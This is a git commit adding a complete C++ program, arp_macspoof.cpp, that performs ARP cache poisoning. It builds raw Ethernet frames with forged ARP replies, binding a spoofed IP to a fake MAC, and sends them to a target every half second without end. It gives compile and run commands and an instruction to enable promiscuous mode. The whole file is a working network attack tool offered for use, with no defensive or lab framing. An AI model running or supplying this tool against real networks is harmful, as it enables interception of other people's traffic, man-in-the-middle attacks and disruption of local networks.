a67642e177b1c72569d8397a9407c0c41f7450c7
zoned out <126989297+phntmzn@users.noreply.github.com>
2026-09-14 10:46:24 -0500

    Create arp_macspoof.cpp

---
+++ arp_macspoof.cpp
@@ -0,0 +1,99 @@
+// Compile: g++ -o arp_macspoof arp_macspoof.cpp
+// Run: sudo ./arp_macspoof <target_ip> <target_mac> <spoof_ip> <fake_mac> <iface>
+// Requires: root privileges
+
+#include <iostream>
+#include <cstring>
+#include <cstdlib>
+#include <cstdio>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <linux/if_packet.h>
+#include <arpa/inet.h>
+
+class ARPMACSpoof {
+private:
+    int sock;
+    std::string iface;
+    
+    void macToBytes(const std::string& mac, uint8_t* out) {
+        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
+    }
+    
+public:
+    ARPMACSpoof(const std::string& i) : iface(i) {
+        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+        
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof(sll));
+        sll.sll_family = AF_PACKET;
+        sll.sll_ifindex = if_nametoindex(iface.c_str());
+        sll.sll_protocol = htons(ETH_P_ARP);
+        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
+    }
+    
+    // Use fake MAC in ARP replies - target's cache shows fake MAC
+    // Real attacker NIC must accept all - use promiscuous mode
+    void sendPoison(const std::string& srcIP, const std::string& fakeMAC,
+                    const std::string& dstIP, const std::string& dstMAC) {
+        uint8_t packet[42];
+        memset(packet, 0, sizeof(packet));
+        
+        struct ether_header* eth = (struct ether_header*)packet;
+        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
+        
+        macToBytes(dstMAC, eth->ether_dhost);
+        macToBytes(fakeMAC, eth->ether_shost);
+        eth->ether_type = htons(ETH_P_ARP);
+        
+        arp->arp_hrd = htons(ARPHRD_ETHER);
+        arp->arp_pro = htons(ETH_P_IP);
+        arp->arp_hln = 6;
+        arp->arp_pln = 4;
+        arp->arp_op = htons(ARPOP_REPLY);
+        
+        macToBytes(fakeMAC, arp->arp_sha);
+        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
+        macToBytes(dstMAC, arp->arp_tha);
+        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
+        
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof(sll));
+        sll.sll_family = AF_PACKET;
+        sll.sll_ifindex = if_nametoindex(iface.c_str());
+        sll.sll_halen = 6;
+        memcpy(sll.sll_addr, eth->ether_dhost, 6);
+        
+        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
+    }
+    
+    void run(const std::string& targetIP, const std::string& targetMAC,
+             const std::string& spoofIP, const std::string& fakeMAC) {
+        std::cout << "[*] ARP poisoning with MAC spoofing\n";
+        std::cout << "[*] Using fake MAC: " << fakeMAC << "\n";
+        std::cout << "[!] Set NIC to promiscuous mode manually:\n";
+        std::cout << "    sudo ip link set " << iface << " promisc on\n";
+        
+        while (true) {
+            sendPoison(spoofIP, fakeMAC, targetIP, targetMAC);
+            usleep(500000);
+        }
+    }
+    
+    ~ARPMACSpoof() { close(sock); }
+};
+
+int main(int argc, char* argv[]) {
+    if (argc != 6) {
+        std::cerr << "Usage: " << argv[0] 
+                  << " <target_ip> <target_mac> <spoof_ip> <fake_mac> <iface>\n";
+        return 1;
+    }
+    ARPMACSpoof poison(argv[5]);
+    poison.run(argv[1], argv[2], argv[3], argv[4]);
+    return 0;
+}
